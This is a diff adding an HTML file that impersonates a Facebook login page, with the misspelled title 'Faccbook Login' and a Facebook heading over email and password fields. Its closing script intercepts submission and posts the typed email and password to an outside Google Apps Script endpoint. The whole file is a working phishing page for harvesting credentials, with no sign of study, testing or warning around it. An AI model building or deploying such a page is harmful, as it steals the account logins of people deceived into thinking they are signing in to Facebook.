@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Faccbook Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #e9eff1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-container {
+      background-color: white;
+      width: 350px;
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .logo img {
+      width: 170px;
+    }
+    .input-group {
+      margin-bottom: 15px;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 12px;
+      font-size: 14px;
+      border: 1px solid #dddfe2;
+      border-radius: 5px;
+    }
+    .input-group input:focus {
+      outline: none;
+      border-color: #4b82e5;
+    }
+    .login-btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .login-btn:hover {
+      background-color: #165eab;
+    }
+    .forgot-password {
+      text-align: center;
+      margin-top: 10px;
+      font-size: 12px;
+    }
+    .forgot-password a {
+      color: #1877f2;
+      text-decoration: none;
+    }
+    .signup-link {
+      text-align: center;
+      margin-top: 15px;
+      font-size: 14px;
+    }
+    .signup-link a {
+      color: #42b72a;
+      font-weight: bold;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="logo">
+      <h1 style="color: #4b82e5;">Facebook</h1>
+    </div>
+    <form name="submit-to-google-sheet">
+      <div class="input-group">
+        <input type="text" name="email" placeholder="Email or Phone" required>
+      </div>
+      <div class="input-group">
+        <input type="password" name="password" placeholder="Password" required>
+      </div>
+      <button type="submit" class="login-btn">Log In</button>
+    </form>
+    
+    <div class="forgot-password">
+      <a href="#">Forgotten password?</a>
+    </div>
+  </div>
+  <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbz3QtFDKj516X36yH8xBZXkSQWoLJqcnqMFCyJgHS1etrFlqDGWTP9qIzOmoLFTLotz/exec'
+    const form = document.forms['submit-to-google-sheet']
+  
+    form.addEventListener('submit', e => {
+      e.preventDefault()
+      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        .then(response => console.log('Success!', response))
+        .catch(error => console.error('Error!', error.message))
+    })
+  </script>
+</body>
+</html>
